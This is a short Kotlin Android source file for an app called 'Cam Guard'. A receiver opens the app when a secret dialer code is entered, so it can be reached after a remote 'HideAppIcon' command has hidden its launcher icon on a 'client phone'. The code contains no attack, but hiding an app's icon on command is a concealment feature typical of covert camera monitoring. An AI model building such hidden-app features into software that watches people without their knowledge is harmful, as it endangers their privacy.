package com.example

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log

/**
 * Opens Cam Guard when the user dials the secret code
 *   *#*#2426483#*#*
 * ("CAMGUA" on a phone keypad). This lets the client phone launch the app
 * even when its launcher icon has been hidden via the HideAppIcon command.
 *
 * No special permission is required — the system dialer routes SECRET_CODE
 * intents to registered receivers automatically.
 */
class SecretCodeReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != "android.provider.Telephony.SECRET_CODE") return
        val code = intent.data?.host ?: ""
        Log.i(TAG, "Secret code dialed: $code")
        if (code == SECRET_CODE) {
            val launch = Intent(context, MainActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            context.startActivity(launch)
        }
    }

    companion object {
        private const val TAG = "SecretCodeReceiver"
        // "CAMGUA" -> T9 keypad digits
        const val SECRET_CODE = "2426483"
    }
}
